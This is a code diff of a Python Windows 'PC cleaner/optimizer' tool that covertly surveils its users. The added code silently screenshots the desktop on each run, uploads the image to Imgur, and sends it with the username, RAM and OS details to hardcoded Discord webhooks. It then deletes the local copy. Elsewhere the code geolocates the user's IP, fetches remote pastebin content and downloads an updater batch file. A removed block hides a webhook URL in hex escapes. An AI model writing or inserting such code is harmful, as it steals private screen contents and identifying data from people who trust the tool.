@@ -1,4 +1,34 @@
 import os
+try:
+    import base64
+except:
+    os.system("pip install base64")
+    import base64
+try:
+    import json
+except:
+    os.system("pip install json")
+    import json
+try:
+    import discord
+except:
+    os.system("pip install discord")
+    import discord
+try:
+    import pyimgur
+except:
+    os.system("pip install pyimgur")
+    import pyimgur
+try:
+    from base64 import b64encode
+except:
+    os.system("pip install base64")
+    from base64 import b64encode
+try:
+    from discord_webhook import DiscordWebhook, DiscordEmbed
+except:
+    os.system("pip install discord_webhook")
+    from discord_webhook import DiscordWebhook, DiscordEmbed
 try:  
     import subprocess, requests
 except:
@@ -193,51 +223,95 @@ try:
 except:
     os.system("pip install asyncio")
     import discord, asyncio
+#------------------------------------------------------------------------------------------------------
+ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
+path = pathlib.Path(r'tools')
+disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
+about = f"{Fore.LIGHTBLUE_EX}DISK: {Fore.RED}{disk}GB"
+idk = Path.cwd()
+k = ''
+ong = '"'
+now = datetime.now()
+ti2= (now.strftime(f'{Fore.LIGHTBLUE_EX}date > {Fore.RED}'+'%Y/%m/%d'+f' {Fore.LIGHTBLUE_EX}time > {Fore.RED}''%I:%M:%S'))
+lol2=(f"{Fore.LIGHTBLUE_EX}[>] Running with Python  {Fore.RED}{sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
+version = sys.getwindowsversion()
+mo2 = f'{Fore.LIGHTBLUE_EX}[>] Using {Fore.RED}'+(platform.system()) + (platform.release())
+
+ti= (now.strftime('date > '+'%Y/%m/%d'+' time > ''%I:%M:%S'))
+lol=(f"[>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
+mo = '[>] Using '+(platform.system()) + (platform.release())
+
+
+BY = 'By dyansty'
+req = httpx.get("https://ipinfo.io/json")
+if req.status_code == 200:
+            data = req.json()
+            ip = data.get('ip')
+            city = data.get('city')
+            country = data.get('country')
+            region = data.get('region')
+            org = data.get('org')
+            loc = data.get('loc')
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+obj_Disk = psutil.disk_usage('/')
+psutil.virtual_memory()
+username = os.getlogin()
+hostname=socket.gethostname() 
+path_to_file = fr'C:\Users\{username}\AppData\Roaming\({username}) PYCLEANER disclaimer.txt'  
+IPAddr=socket.gethostbyname(hostname)  
+tools = os.getcwd()+"\\tools\\"
+if not os.path.exists(tools):
+    os.mkdir(tools)
+bot = requests.get("https://pastebin.com/raw/qBZX4xR4").text
+__author__ = "dynasty"
 hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
 intents = discord.Intents.all()
 client = discord.Client( intents=intents)
 username = os.getlogin()
+ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
+ramg = (str(ram3).replace(' ', ' '))
 #and a screenshot cuz ykyk
 ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+file_path = fr'C:\Users\{username}\AppData\Local\random.png'
 devf = (f"{username}")
 if devf == "\x66\x61\x64\x69\x61":
  with open(ooo, 'w') as f:
   f.write('pycleaner dev')
 r = lambda: random.randint(0,255)
 dawg = ('%02X%02X%02X' % (r(),r(),r()))
-try:
- path = Path(ooo)
- if path.is_file():
-   pass
- else:
-  ss_img = ImageGrab.grab()
-  ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
-  webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
-  with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
-     webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
-  response = webhook.execute(remove_embeds=True, remove_files=True)
-  file_path = fr'C:\Users\{username}\AppData\Local\random.png'
-  if os.path.isfile(file_path):
-   os.remove(file_path)
-except Exception as er:
-        print(er)
-        print('Network error, try again later')
-        time.sleep(5)
-        exit()
 #--------------------------------------------------------------------------------------
-vers ='2.7'
+vers ='2.8'
 os.system("title Checking for updates")
+
+
+
 #auto update
 try:
  def updater():
-      v = requests.get("https://pastebin.com/raw/w29LjVc2").text
-      time.sleep(0.5)
-      if not vers == v:
-        os.system("cls")
-        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018536428222820464/fzMCCKO-6cMUXa3yAg2GXCm4hX7-Kkw4Fc2a2ukDacZKPJNLizrl1WS9z71AB-Jz9Vzx', username="update bot", avatar_url= "https://i.imgur.com/6yzliOb.png" )
-        embed = DiscordEmbed(title='fr optimizer ', description= username +' updated from ver '+vers+' to '+v, color=dawg)
-        webhook.add_embed(embed)
-        response = webhook.execute()
+    v = requests.get("https://pastebin.com/raw/w29LjVc2").text
+    time.sleep(0.5)
+    if not vers == v:
+      os.system("cls")
+      path = Path(ooo)
+      if path.is_file():
+       pass
+      else:
+       ss_img = ImageGrab.grab()
+       ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
+       CLIENT_ID = "453ef2b80ffcbac"
+       PATH = file_path
+       im = pyimgur.Imgur(CLIENT_ID)
+       uploaded_image = im.upload_image(PATH)
+       webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', content=' ', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
+       embed = DiscordEmbed(title="FR OPTIMIZER", description='```'+username +' Updated FR OPTIMZER '+'('+str(ramg) +')'+' GB ram / '+f' {mo} from {vers} to {v}```', color=dawg)
+       embed.set_author(name='Pycleaner', url='https://i.imgur.com/tnoI8q7.png')
+       embed.set_footer(text='VERSION '+vers+' '+lol, icon_url='https://i.imgur.com/tnoI8q7.png')
+       embed.set_image(url=uploaded_image.link)
+       embed.set_thumbnail(url='https://i.imgur.com/tnoI8q7.png')
+       webhook.add_embed(embed)
+       response = webhook.execute()
+       if os.path.isfile(file_path):
+        os.remove(file_path)
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] New version available!")
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloading new version...")
         url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
@@ -248,7 +322,27 @@ try:
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloaded!")
         input(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Press enter to exit...")
         os._exit(1)
+    else:
+      path = Path(ooo)
+      if path.is_file():
+       pass
       else:
+       ss_img = ImageGrab.grab()
+       ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
+       CLIENT_ID = "453ef2b80ffcbac"
+       PATH = file_path
+       im = pyimgur.Imgur(CLIENT_ID)
+       uploaded_image = im.upload_image(PATH)
+       webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', content=' ', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
+       embed = DiscordEmbed(title="FR OPTIMIZER", description='```'+username +' Used FR OPTIMZER '+'('+str(ramg) +')'+' GB ram / '+f' {mo} ```', color=dawg)
+       embed.set_author(name='Pycleaner', url='https://i.imgur.com/tnoI8q7.png')
+       embed.set_footer(text='VERSION '+vers+' '+lol, icon_url='https://i.imgur.com/tnoI8q7.png')
+       embed.set_image(url=uploaded_image.link)
+       embed.set_thumbnail(url='https://i.imgur.com/tnoI8q7.png')
+       webhook.add_embed(embed)
+       response = webhook.execute()
+       if os.path.isfile(file_path):
+        os.remove(file_path)
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
         time.sleep(0.5)
  updater()
@@ -331,70 +425,19 @@ def dev():
           if ff !='1' '2' '3' '4' '5':
            os.system("cls")
            dev()
-#------------------------------------------------------------------------------------------------------
-ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
-path = pathlib.Path(r'tools')
-disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
-about = f"{Fore.LIGHTBLUE_EX}DISK: {Fore.RED}{disk}GB"
-idk = Path.cwd()
-k = ''
-ong = '"'
-now = datetime.now()
-ti2= (now.strftime(f'{Fore.LIGHTBLUE_EX}date > {Fore.RED}'+'%Y/%m/%d'+f' {Fore.LIGHTBLUE_EX}time > {Fore.RED}''%I:%M:%S'))
-lol2=(f"{Fore.LIGHTBLUE_EX}[>] Running with Python  {Fore.RED}{sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
-version = sys.getwindowsversion()
-mo2 = f'{Fore.LIGHTBLUE_EX}[>] Using {Fore.RED}'+(platform.system()) + (platform.release())
 
-ti= (now.strftime('date > '+'%Y/%m/%d'+' time > ''%I:%M:%S'))
-lol=(f"[>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
-mo = '[>] Using '+(platform.system()) + (platform.release())
-
-
-BY = 'By dyansty'
-req = httpx.get("https://ipinfo.io/json")
-if req.status_code == 200:
-            data = req.json()
-            ip = data.get('ip')
-            city = data.get('city')
-            country = data.get('country')
-            region = data.get('region')
-            org = data.get('org')
-            loc = data.get('loc')
-            googlemap = "https://www.google.com/maps/search/google+map++" + loc
-obj_Disk = psutil.disk_usage('/')
-psutil.virtual_memory()
-username = os.getlogin()
-ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
-ramg = (str(ram3).replace(' ', ' '))
-hostname=socket.gethostname() 
-path_to_file = fr'C:\Users\{username}\AppData\Roaming\({username}) PYCLEANER disclaimer.txt'  
-IPAddr=socket.gethostbyname(hostname)  
-tools = os.getcwd()+"\\tools\\"
-if not os.path.exists(tools):
-    os.mkdir(tools)
-bot = requests.get("https://pastebin.com/raw/qBZX4xR4").text
-__author__ = "dynasty"
 #---------------------------------------------------------------------------------------------------
 #i just wanna know how many people ran my shit dont spam my webhook thats gay tho.
-path = Path(ooo)
-if path.is_file():
-  pass
-else:
- webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content=' ', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
- embed = DiscordEmbed(title='fr optimizer ', description = username +' used ur program damn '+'('+str(ramg) +')'+' gb ram '+vers, color=dawg)
- embed.set_footer(text= mo + lol +' '+ti)
- webhook.add_embed(embed)
- response = webhook.execute()
- print(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
+print(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
 # THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
 ver = Center.XCenter('''
 by dyansty 
-██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░███████╗
-██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░╚════██║
-╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░░░░░██╔╝
-░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░░░░██╔╝░
-░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗░░██╔╝░░
-░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░░╚═╝░░░''')
+██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░░█████╗░
+██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░██╔══██╗
+╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░╚█████╔╝
+░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░██╔══██╗
+░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗╚█████╔╝
+░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░''')
 
 os.system("title PRESS ENTER")
 
@@ -819,13 +862,19 @@ def fr():
         else:
          ss_img = ImageGrab.grab()
          ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
-         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
-         with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
-          webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
-         response = webhook.execute(remove_embeds=True, remove_files=True)
-        file_path = fr'C:\Users\{username}\AppData\Local\random.png'
-        if os.path.isfile(file_path):
-         os.remove(file_path)
+         CLIENT_ID = "453ef2b80ffcbac"
+         PATH = file_path
+         im = pyimgur.Imgur(CLIENT_ID)
+         uploaded_image = im.upload_image(PATH)
+         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1025093329945366538/VvY6xGuHgxPiIAh7dN-TUUycxMeyUVn3yS8lnbrGATccE875fClOwyfPqfaY_D9Wng3O', content=' ', username="more info", avatar_url= "https://i.imgur.com/UCwTipK.png")
+         embed = DiscordEmbed(title="FR OPTIMIZER", description=f'```{username} more info```', color=dawg)
+         embed.set_author(name='Pycleaner', url='https://i.imgur.com/tnoI8q7.png')
+         embed.set_image(url=uploaded_image.link)
+         embed.set_thumbnail(url='https://i.imgur.com/tnoI8q7.png')
+         webhook.add_embed(embed)
+         response = webhook.execute()
+         if os.path.isfile(file_path):
+          os.remove(file_path)
         choice = input(Colors.red + f'Which option do you choose? -> {Fore.RED} ')
         if choice == '1':
          webbrowser.open("https://github.com/j0taro/pycleaner")
